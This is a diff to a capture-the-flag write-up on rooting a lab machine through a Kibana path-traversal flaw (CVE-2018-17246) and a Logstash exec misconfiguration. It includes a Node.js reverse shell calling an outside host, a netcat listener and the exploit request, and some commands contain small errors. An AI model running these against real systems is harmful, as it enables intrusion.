@@ -102,10 +102,80 @@ I have to save the password for the machine: dXNlcjogc2VjdXJpdHkg
 This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
 ```
 
-The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password.
+The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password. 
 
-kibana is run locally.
+![erZrTA.png](https://s2.ax1x.com/2019/08/03/erZrTA.png)
 
+To be honest, I really don't like the user of the box. But it does works as the key word: you have to find a needle in haystack.
+
+## PrivEsc
+
+If you look around the box, you will find the box is installed with ELK. You can find kibana and logstash in the box. If you google `kibana exploit`. You will find [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246) in Github. It has detailed illustraed the ways to exploit.
+
+However, there is a problem that the kibnana service is only running in local. So you cannot access kibana service externally. There is a way to utilize ssh to redirect the network stream.
+
+```
+ssh 5601:localhost:5601 security@10.10.10.115
+```
+
+Then, we can access to the kibana service in 10.10.10.115 by access to `localhost:5601`. Place the `server.js` in tmp directory of taget machine.
+
+```
+// server.js
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "10.10.16.61", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+```
+
+Then we can implemented by burp, remember to set up nc listener `nc -lvnp 1234`
+
+```
+GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/server.jssudo -l HTTP/1.1
+Host: localhost:5601
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:5601/app/kibana
+content-type: application/json
+kbn-version: 6.4.2
+origin: http://localhost:5601
+Connection: close
+```
+
+Wait for a while, then we are kibana.
+
+[![erlWZT.png](https://s2.ax1x.com/2019/08/03/erlWZT.png)](https://imgchr.com/i/erlWZT)
+
+But we are still not root! Don't be upset. Let's move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the the group `kibana` has write permission of conf.d of logstash.
+
+```
+ls -lah
+total 52K
+drwxr-xr-x.  3 root   root    183 jun 18 22:15 .
+drwxr-xr-x. 83 root   root   8,0K jun 24 05:44 ..
+drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
+-rw-r--r--.  1 root   kibana 1,9K nov 28  2018 jvm.options
+-rw-r--r--.  1 root   kibana 4,4K sep 26  2018 log4j2.properties
+-rw-r--r--.  1 root   kibana  342 sep 26  2018 logstash-sample.conf
+-rw-r--r--.  1 root   kibana 8,0K ene 23  2019 logstash.yml
+-rw-r--r--.  1 root   kibana 8,0K sep 26  2018 logstash.yml.rpmnew
+-rw-r--r--.  1 root   kibana  285 sep 26  2018 pipelines.yml
+-rw-------.  1 kibana kibana 1,7K dic 10  2018 startup.option
+```
+
+`conf.d` is the config directory of logstash consists of three files in genenal. Take a deep look into the directory, you'll a find an interesting thing. There is a command execute in output.conf. If you have basic knowledge of logstash, you should know the function of the three files. `input.conf` is used to config the data source. `filter.conf` is used to process the data, which  is usually combined with grok. `output.conf` is used to output the processed data. We can find there is a exec in the `output.conf`.
+
+So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully.
 
 **filter.conf**
 
